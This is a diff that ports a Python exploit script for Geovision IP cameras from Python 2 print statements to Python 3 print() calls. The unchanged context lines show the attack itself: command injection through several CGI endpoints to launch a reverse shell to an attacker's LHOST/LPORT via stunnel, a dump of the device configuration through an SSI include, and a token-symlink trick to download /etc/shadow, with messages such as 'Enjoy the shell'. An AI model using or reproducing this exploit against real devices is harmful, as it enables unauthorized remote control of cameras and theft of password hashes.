@@ -37,6 +37,7 @@
 
 ############################################################################################
 
+from __future__ import print_function
 import sys
 import socket
 import urllib, urllib2, httplib
@@ -94,17 +95,17 @@ class HTTPconnect:
 		url = '{}://{}{}'.format(self.proto, self.host, self.uri)
 
 		if self.verbose:
-			print "[Verbose] Sending:", url
+			print("[Verbose] Sending:", url)
 
 		if self.proto == 'https':
 			if hasattr(ssl, '_create_unverified_context'):
-				print "[i] Creating SSL Unverified Context"
+				print("[i] Creating SSL Unverified Context")
 				ssl._create_default_https_context = ssl._create_unverified_context
 
 		if self.credentials:
 			Basic_Auth = self.credentials.split(':')
 			if self.verbose:
-				print "[Verbose] User:",Basic_Auth[0],"password:",Basic_Auth[1]
+				print("[Verbose] User:",Basic_Auth[0],"password:",Basic_Auth[1])
 			try:
 				pwd_mgr = urllib2.HTTPpasswordMgrWithDefaultDahua_realm()
 				pwd_mgr.add_password(None, url, Basic_Auth[0], Basic_Auth[1])
@@ -116,7 +117,7 @@ class HTTPconnect:
 					opener = urllib2.build_opener(auth_handler,NoRedirection)
 				urllib2.install_opener(opener)
 			except Exception as e:
-				print "[!] Basic Auth Error:",e
+				print("[!] Basic Auth Error:",e)
 				sys.exit(1)
 		else:
 			# Don't follow redirects!
@@ -130,7 +131,7 @@ class HTTPconnect:
 
 
 		if self.noexploit and not self.verbose:
-			print "[<] 204 Not Sending!"
+			print("[<] 204 Not Sending!")
 			html =  "Not sending any data"
 			return html
 		else:
@@ -146,7 +147,7 @@ class HTTPconnect:
 					req.add_header('Cookie', Cookie)
 			rsp = urllib2.urlopen(req)
 			if rsp:
-				print "[<] {}".format(rsp.code)
+				print("[<] {}".format(rsp.code))
 
 		if self.Raw:
 			return rsp
@@ -227,7 +228,7 @@ class Geovision:
 
 		try:
 
-			print "[>] Requesting keys from remote"
+			print("[>] Requesting keys from remote")
 			URI = '/ssi.cgi/Login.htm'
 			response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,None,None)
 			response = response.read()[:1500]
@@ -235,7 +236,7 @@ class Geovision:
 	#		print response
 
 		except Exception as e:
-			print "[!] Can't access remote host... ({})".format(e)
+			print("[!] Can't access remote host... ({})".format(e))
 			sys.exit(1)
 
 		try:
@@ -247,10 +248,10 @@ class Geovision:
 			for check in range(0,len(response)):
 				if response[check] == 'cc1=':
 					CC1 = response[check+1]
-					print "[i] Random key CC1: {}".format(response[check+1])
+					print("[i] Random key CC1: {}".format(response[check+1]))
 				elif response[check] == 'cc2=':
 					CC2 = response[check+1]
-					print "[i] Random key CC2: {}".format(response[check+1])
+					print("[i] Random key CC2: {}".format(response[check+1]))
 				"""
 				#
 				# Less interesting to know, but leave it here anyway.
@@ -271,8 +272,8 @@ class Geovision:
 				"""
 
 			if not CC1 and not CC2:
-				print "[!] CC1 and CC2 missing!"
-				print "[!] Cannot generate MD5, exiting.."
+				print("[!] CC1 and CC2 missing!")
+				print("[!] Cannot generate MD5, exiting..")
 				sys.exit(0)
 
 			#
@@ -294,22 +295,22 @@ class Geovision:
 				"is_check_OCX_OK":0
 				}
 
-			print "[>] Logging in"
+			print("[>] Logging in")
 			URI = '/LoginPC.cgi'
 			response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
 	#		print response.info()
 
 			# if we don't get 'Set-Cookie' back from the server, the Login has failed
 			if not (response.info().get('Set-Cookie')):
-				print "[!] Login Failed!"
+				print("[!] Login Failed!")
 				sys.exit(1)
 			if verbose:
-				print "Cookie: {}".format(response.info().get('Set-Cookie'))
+				print("Cookie: {}".format(response.info().get('Set-Cookie')))
 
 			return response.info().get('Set-Cookie')
 
 		except Exception as e:
-			print "[i] What happen? ({})".format(e)
+			print("[i] What happen? ({})".format(e))
 			exit(0)
 
 
@@ -319,11 +320,11 @@ class Geovision:
 			URI = '/PSIA/System/deviceInfo'
 			response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,self.headers,None,None)
 			deviceinfo = xmltodict.parse(response)
-			print "[i] Remote target: {} ({})".format(deviceinfo['DeviceInfo']['model'],deviceinfo['DeviceInfo']['firmwareVersion'])
+			print("[i] Remote target: {} ({})".format(deviceinfo['DeviceInfo']['model'],deviceinfo['DeviceInfo']['firmwareVersion']))
 			return True
 
 		except Exception as e:
-			print "[i] Info about remote target failed ({})".format(e)
+			print("[i] Info about remote target failed ({})".format(e))
 			return False
 
 
@@ -331,11 +332,11 @@ class Geovision:
 		self.DumpSettings = DumpSettings
 
 		if self.DumpSettings:
-			print "[i] Dump Config of remote"
+			print("[i] Dump Config of remote")
 			SH_CMD = '`echo "<!--#include file="SYS_CFG"-->" >/var/www/tmp/Login.htm`'
 		else:
 
-			print "[i] Launching TLSv1 privacy reverse shell"
+			print("[i] Launching TLSv1 privacy reverse shell")
 			self.headers = {
 				'Connection': 'close',
 				'Accept-Language'	:	'en-US,en;q=0.8',
@@ -347,7 +348,7 @@ class Geovision:
 			SH_CMD = SH_CMD.replace("LHOST",lhost)
 			SH_CMD = SH_CMD.replace("LPORT",lport)
 
-		print "[>] Pwning Usersetting.cgi"
+		print("[>] Pwning Usersetting.cgi")
 		self.query_args = {
 			"umd5":SH_CMD,
 			"pmd5":"GEOVISION",
@@ -364,15 +365,15 @@ class Geovision:
 			URI = '/UserSetting.cgi'
 			response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
 			if DumpSettings:
-				print "[i] Dumping"
+				print("[i] Dumping")
 				URI = '/ssi.cgi/tmp/Login.htm'
 				response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,self.headers,None,self.SessionID)
-				print response
+				print(response)
 				return True
 
 		except Exception as e:
 			if str(e) == "timed out" or str(e) == "('The read operation timed out',)":
-				print "[!] Enjoy the shell... ({})".format(e)
+				print("[!] Enjoy the shell... ({})".format(e))
 				return True
 
 
@@ -380,11 +381,11 @@ class Geovision:
 		self.DumpSettings = DumpSettings
 
 		if self.DumpSettings:
-			print "[i] Dump Config of remote"
+			print("[i] Dump Config of remote")
 			SH_CMD = '`echo "<!--#include file="SYS_CFG"-->" >/var/www/tmp/Login.htm`'
 		else:
 
-			print "[i] Launching TLSv1 privacy reverse shell"
+			print("[i] Launching TLSv1 privacy reverse shell")
 			self.headers = {
 				'Connection': 'close',
 				'Accept-Language'	:	'en-US,en;q=0.8',
@@ -396,7 +397,7 @@ class Geovision:
 			SH_CMD = SH_CMD.replace("LHOST",lhost)
 			SH_CMD = SH_CMD.replace("LPORT",lport)
 
-		print "[>] Pwning PictureCatch.cgi"
+		print("[>] Pwning PictureCatch.cgi")
 		self.query_args = {
 			"username":SH_CMD,
 			"password":"GEOVISION",
@@ -410,14 +411,14 @@ class Geovision:
 			URI = '/PictureCatch.cgi'
 			response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
 			if DumpSettings:
-				print "[i] Dumping"
+				print("[i] Dumping")
 				URI = '/ssi.cgi/tmp/Login.htm'
 				response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,self.headers,None,self.SessionID)
-				print response
+				print(response)
 				return True
 		except Exception as e:
 			if str(e) == "timed out" or str(e) == "('The read operation timed out',)":
-				print "[!] Enjoy the shell... ({})".format(e)
+				print("[!] Enjoy the shell... ({})".format(e))
 				return True
 
 
@@ -425,11 +426,11 @@ class Geovision:
 		self.DumpSettings = DumpSettings
 
 		if self.DumpSettings:
-			print "[i] Dump Config of remote"
+			print("[i] Dump Config of remote")
 			SH_CMD = '`echo "<!--#include file="SYS_CFG"-->" >/var/www/tmp/Login.htm`'
 		else:
 
-			print "[i] Launching TLSv1 privacy reverse shell"
+			print("[i] Launching TLSv1 privacy reverse shell")
 			self.headers = {
 				'Connection': 'close',
 				'Accept-Language'	:	'en-US,en;q=0.8',
@@ -441,7 +442,7 @@ class Geovision:
 			SH_CMD = SH_CMD.replace("LHOST",lhost)
 			SH_CMD = SH_CMD.replace("LPORT",lport)
 
-		print "[>] Pwning JpegStream.cgi"
+		print("[>] Pwning JpegStream.cgi")
 		self.query_args = {
 			"username":SH_CMD,
 			"password":"GEOVISION",
@@ -455,14 +456,14 @@ class Geovision:
 			URI = '/JpegStream.cgi'
 			response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
 			if DumpSettings:
-				print "[i] Dumping"
+				print("[i] Dumping")
 				URI = '/ssi.cgi/tmp/Login.htm'
 				response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,self.headers,None,self.SessionID)
-				print response
+				print(response)
 				return True
 		except Exception as e:
 			if str(e) == "timed out" or str(e) == "('The read operation timed out',)":
-				print "[!] Enjoy the shell... ({})".format(e)
+				print("[!] Enjoy the shell... ({})".format(e))
 				return True
 
 #
@@ -490,7 +491,7 @@ class Geovision:
 	def FilterSetting(self):
 
 		try:
-			print "[>] Pwning FilterSetting.cgi"
+			print("[>] Pwning FilterSetting.cgi")
 			#
 			# ';' will be treated by the code as LF
 			# 
@@ -529,7 +530,7 @@ class Geovision:
 						CMD[LINE] = CMD_DO_LF.replace("TMP",cmd_split[CMD_LEN])
 						LF = 0
 					if verbose:
-						print "Len: {} {}".format(len(CMD[LINE]),CMD[LINE])
+						print("Len: {} {}".format(len(CMD[LINE]),CMD[LINE]))
 
 			# Add two more commands to execute stunnel and remove /tmp/x
 			CMD[LINE+1] = "`/usr/local/bin/stunnel /tmp/x`" # 31 char, no /usr/local/bin in $PATH
@@ -550,7 +551,7 @@ class Geovision:
 			who = 0
 			# Clean up to make room, just in case
 			for Remove in range(0,4):
-				print "[>] Cleaning ipfilter entry: {}".format(Remove+1)
+				print("[>] Cleaning ipfilter entry: {}".format(Remove+1))
 				self.query_args = {
 					"bPolicy":"0",		# 1 = Enable, 0 = Disable
 					"Delete":"Remove",	# Remove entry
@@ -565,7 +566,7 @@ class Geovision:
 					break
 				if CMD_LEN < 4:
 
-					print "[>] Sending: {} ({})".format(CMD[who],len(CMD[who]))
+					print("[>] Sending: {} ({})".format(CMD[who],len(CMD[who])))
 					self.query_args = {
 						"szIpAddr":CMD[who], # 31 char limit
 						"byOpId":"0", # 0 = Allow, 1 = Deny
@@ -574,19 +575,19 @@ class Geovision:
 						}
 					response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
 					response = re.split('[()<>?"\n_&;/ ]',response)
-					print response
+					print(response)
 					if NEW_IP_FILTER:
 						for cnt in range(0,len(response)):
 							if response[cnt] == 'iptables':
 								NEW_IP_FILTER = 0
-								print "[i] Remote don't need Enable/Disable"
+								print("[i] Remote don't need Enable/Disable")
 								break
 					CMD_LEN += 1
 					who += 1
 					time.sleep(2) # Seems to be too fast without
 				# NEW Way
 				elif NEW_IP_FILTER:
-					print "[>] Enabling ipfilter"
+					print("[>] Enabling ipfilter")
 					self.query_args = {
 						"bPolicy":"1", # 1 = Enable, 0 = Disable
 						"szIpAddr":"",
@@ -596,10 +597,10 @@ class Geovision:
 
 					response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
 
-					print "[i] Sleeping..."
+					print("[i] Sleeping...")
 					time.sleep(5)
 
-					print "[>] Disabling ipfilter"
+					print("[>] Disabling ipfilter")
 					self.query_args = {
 						"szIpAddr":"",
 						"byOpId":"0",
@@ -608,7 +609,7 @@ class Geovision:
 					response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
 
 					for Remove in range(0,4):
-						print "[>] Deleting ipfilter Entry: {}".format(Remove+1)
+						print("[>] Deleting ipfilter Entry: {}".format(Remove+1))
 						self.query_args = {
 							"bPolicy":"0", # 1 = Enable, 0 = Disable
 							"Delete":"Remove",
@@ -621,7 +622,7 @@ class Geovision:
 				# OLD Way
 				else:
 					for Remove in range(0,4):
-						print "[>] Deleting ipfilter Entry: {}".format(Remove+1)
+						print("[>] Deleting ipfilter Entry: {}".format(Remove+1))
 						self.query_args = {
 							"bPolicy":"0", # 1 = Enable, 0 = Disable
 							"Delete":"Remove",
@@ -633,8 +634,8 @@ class Geovision:
 					CMD_LEN = 0
 
 			if NEW_IP_FILTER:
-				print "[i] Last sending"
-				print "[>] Enabling ipfilter"
+				print("[i] Last sending")
+				print("[>] Enabling ipfilter")
 				self.query_args = {
 					"bPolicy":"1", # 1 = Enable, 0 = Disable
 					"szIpAddr":"",
@@ -644,10 +645,10 @@ class Geovision:
 
 				response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
 
-				print "[i] Sleeping..."
+				print("[i] Sleeping...")
 				time.sleep(5)
 
-				print "[>] Disabling ipfilter"
+				print("[>] Disabling ipfilter")
 				self.query_args = {
 					"szIpAddr":"",
 					"byOpId":"0",
@@ -656,7 +657,7 @@ class Geovision:
 				response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
 
 				for Remove in range(0,4):
-					print "[>] Deleting ipfilter Entry: {}".format(Remove+1)
+					print("[>] Deleting ipfilter Entry: {}".format(Remove+1))
 					self.query_args = {
 						"bPolicy":"0", # 1 = Enable, 0 = Disable
 						"Delete":"Remove",
@@ -666,16 +667,16 @@ class Geovision:
 						}
 					response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
 			
-			print "[!] Enjoy the shell... "
+			print("[!] Enjoy the shell... ")
 
 			return True
 
 		except Exception as e:
 
 			if not NEW_IP_FILTER:
-				print "[i] Last sending"
+				print("[i] Last sending")
 				for Remove in range(0,4):
-					print "[>] Deleting ipfilter Entry: {}".format(Remove+1)
+					print("[>] Deleting ipfilter Entry: {}".format(Remove+1))
 					self.query_args = {
 						"bPolicy":"0", # 1 = Enable, 0 = Disable
 						"Delete":"Remove",
@@ -684,18 +685,18 @@ class Geovision:
 						"dwSelIndex":"0",
 						}
 					response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
-				print "[!] Enjoy the shell... "
+				print("[!] Enjoy the shell... ")
 				return True
 
-			print "[!] Hmm... {}".format(e)
-			print response.read()
+			print("[!] Hmm... {}".format(e))
+			print(response.read())
 			return True
 
 
 	def GeoToken(self):
 
-		print "[i] GeoToken PoC to login and download /etc/shadow via token symlink"
-		print "[!] You must have valid login and password to generate the symlink"
+		print("[i] GeoToken PoC to login and download /etc/shadow via token symlink")
+		print("[!] You must have valid login and password to generate the symlink")
 		try:
 
 #########################################################################################
@@ -755,14 +756,14 @@ class Geovision:
 			"""
 
 			# Request remote MD5 token1
-			print "[>] Requesting token1"
+			print("[>] Requesting token1")
 			URI = '/BKCmdToken.php'
 			response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,None,None)
 			result = json.load(response)
 			if verbose:
-				print json.dumps(result,sort_keys=True,indent=4, separators=(',', ': '))
+				print(json.dumps(result,sort_keys=True,indent=4, separators=(',', ': ')))
 
-			print "[i] Request OK?: {}".format(result['success'])
+			print("[i] Request OK?: {}".format(result['success']))
 			if not result['success']:
 				return False
 			token1 = result['token']
@@ -791,17 +792,17 @@ class Geovision:
 				"filename":filename
 				}
 
-			print "[>] Requesting download file link"
+			print("[>] Requesting download file link")
 			URI = '/BKDownloadLink.cgi'
 			response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,None)
 			response = response.read()#[:900]
 			response = response.replace("'", "\"")
 			result = json.loads(response)
-			print "[i] Request OK?: {}".format(result['success'])
+			print("[i] Request OK?: {}".format(result['success']))
 			if not result['success']:
 				return False
 			if verbose:
-				print json.dumps(result,sort_keys=True,indent=4, separators=(',', ': '))
+				print(json.dumps(result,sort_keys=True,indent=4, separators=(',', ': ')))
 
 
 #
@@ -817,14 +818,14 @@ class Geovision:
 
 			URI = '/ssi.cgi' + result['dl_folder'] + '/' + result['dl_token']
 
-			print "[>] downloading ({}) with ({})".format(filename,URI)
+			print("[>] downloading ({}) with ({})".format(filename,URI))
 			response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,None)
 			response = response.read()
-			print response
+			print(response)
 			return True
 
 		except Exception as e:
-			print "[i] GEO Token fail ({})".format(e)
+			print("[i] GEO Token fail ({})".format(e))
 			return False
 
 
@@ -896,10 +897,10 @@ if __name__ == '__main__':
 		arg_parser.add_argument('--noexploit', required=False, default=False, action='store_true', help='Simple testmode; With --verbose testing all code without exploiting [Default: False]')
 		args = arg_parser.parse_args()
 	except Exception as e:
-		print INFO,"\nError: {}\n".format(str(e))
+		print(INFO,"\nError: {}\n".format(str(e)))
 		sys.exit(1)
 
-	print "\n[*]",INFO
+	print("\n[*]",INFO)
 
 	if args.verbose:
 		verbose = args.verbose
@@ -971,35 +972,35 @@ if __name__ == '__main__':
 				'User-Agent':'Mozilla'
 				}
 
-			print "[>] Trying to find out my external IP"
+			print("[>] Trying to find out my external IP")
 			lhost = HTTPconnect("whatismyip.akamai.com",proto,verbose,credentials,False,noexploit).Send("/",headers,None,None)
 			if verbose:
-				print "[Verbose] Detected my external IP:",lhost
+				print("[Verbose] Detected my external IP:",lhost)
 		except Exception as e:
-			print "[<] ",e
+			print("[<] ",e)
 			sys.exit(1)
 
 	# Check if RPORT is valid
 	if not Validate(verbose).Port(rport):
-		print "[!] Invalid RPORT - Choose between 1 and 65535"
+		print("[!] Invalid RPORT - Choose between 1 and 65535")
 		sys.exit(1)
 
 	# Check if RHOST is valid IP or FQDN, get IP back
 	rhost = Validate(verbose).Host(rhost)
 	if not rhost:
-		print "[!] Invalid RHOST"
+		print("[!] Invalid RHOST")
 		sys.exit(1)
 
 	# Check if LHOST is valid IP or FQDN, get IP back
 	lhost = Validate(verbose).Host(lhost)
 	if not lhost:
-		print "[!] Invalid LHOST"
+		print("[!] Invalid LHOST")
 		sys.exit(1)
 
 	# Check if RHOST is valid IP or FQDN, get IP back
 	rhost = Validate(verbose).Host(rhost)
 	if not rhost:
-		print "[!] Invalid RHOST"
+		print("[!] Invalid RHOST")
 		sys.exit(1)
 
 
@@ -1007,12 +1008,12 @@ if __name__ == '__main__':
 # Validation done, start print out stuff to the user
 #
 	if args.https:
-		print "[i] HTTPS / SSL Mode Selected"
-	print "[i] Remote target IP:",rhost
-	print "[i] Remote target PORT:",rport
+		print("[i] HTTPS / SSL Mode Selected")
+	print("[i] Remote target IP:",rhost)
+	print("[i] Remote target PORT:",rport)
 	if not args.geotoken and not args.dump and not args.deviceinfo:
-		print "[i] Connect back IP:",lhost
-		print "[i] Connect back PORT:",lport
+		print("[i] Connect back IP:",lhost)
+		print("[i] Connect back PORT:",lport)
 
 	rhost = rhost + ':' + rport
 
@@ -1037,7 +1038,7 @@ if __name__ == '__main__':
 	if GEOtoken:
 		Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).DeviceInfo()
 		if not Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).GeoToken():
-			print "[!] Failed"
+			print("[!] Failed")
 			sys.exit(1)
 		else:
 			sys.exit(0)
@@ -1046,14 +1047,14 @@ if __name__ == '__main__':
 	if anonymous:
 		if jpegstream:
 			if not Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).JpegStream(DumpSettings):
-				print "[!] Failed"
+				print("[!] Failed")
 				sys.exit(0)
 		elif picturecatch:
 			if not Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).PictureCatch(DumpSettings):
-				print "[!] Failed"
+				print("[!] Failed")
 				sys.exit(0)
 		else:
-			print "[!] Needed: --anonymous [--picturecatch | --jpegstream]"
+			print("[!] Needed: --anonymous [--picturecatch | --jpegstream]")
 			sys.exit(1)
 
 	else:
@@ -1063,25 +1064,25 @@ if __name__ == '__main__':
 		if usersetting:
 			if Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).Login():
 				if not Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).UserSetting(DumpSettings):
-					print "[!] Failed"
+					print("[!] Failed")
 					sys.exit(0)
 		elif filtersetting:
 			if Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).Login():
 				if not Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).FilterSetting():
-					print "[!] Failed"
+					print("[!] Failed")
 					sys.exit(0)
 		elif jpegstream:
 			if Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).Login():
 				if not Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).JpegStream(DumpSettings):
-					print "[!] Failed"
+					print("[!] Failed")
 					sys.exit(0)
 		elif picturecatch:
 			if Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).Login():
 				if not Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).PictureCatch(DumpSettings):
-					print "[!] Failed"
+					print("[!] Failed")
 					sys.exit(0)
 		else:
-			print "[!] Needed: --usersetting | --jpegstream | --picturecatch | --filtersetting"
+			print("[!] Needed: --usersetting | --jpegstream | --picturecatch | --filtersetting")
 			sys.exit(1)
 
 	sys.exit(0)
